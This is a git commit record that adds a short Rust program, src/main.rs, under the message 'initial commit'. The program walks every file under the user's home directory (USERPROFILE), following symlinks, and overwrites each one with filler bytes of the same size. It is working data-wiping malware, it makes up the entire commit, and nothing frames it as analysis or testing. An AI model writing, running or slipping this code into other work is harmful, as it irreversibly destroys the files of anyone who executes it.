e76d68aa9af642aa73d8d3674e1884ff1d4f74d2
mammamiiiya <wsluser@DESKTOP-BBJID6K.localdomain>
2022-02-08 11:12:14 +0545

    initial commit

---
+++ src/main.rs
@@ -0,0 +1,22 @@
+use std::env;
+use walkdir::WalkDir;
+use std::fs;
+
+fn main() {
+    let home_path = env::var_os("USERPROFILE").unwrap(); // HOME for Linux; USERPROFILE for Windows
+    
+    const OVERWRITE_DATA: u8 = 1;
+
+    for entry in WalkDir::new(home_path)
+        .follow_links(true)
+        .into_iter()
+        .filter_map(|e| e.ok()) {
+            if entry.metadata().unwrap().is_file() {
+                let the_file: String = entry.path().display().to_string();
+                let the_actual_file: String = entry.path().display().to_string();
+                let file_metadata = fs::metadata(the_file).unwrap();
+                let file_size: usize = file_metadata.len().try_into().unwrap();
+                fs::write(the_actual_file, vec![OVERWRITE_DATA; file_size]).expect("Something went wrong while over-writing the file!");
+            }
+        }
+}
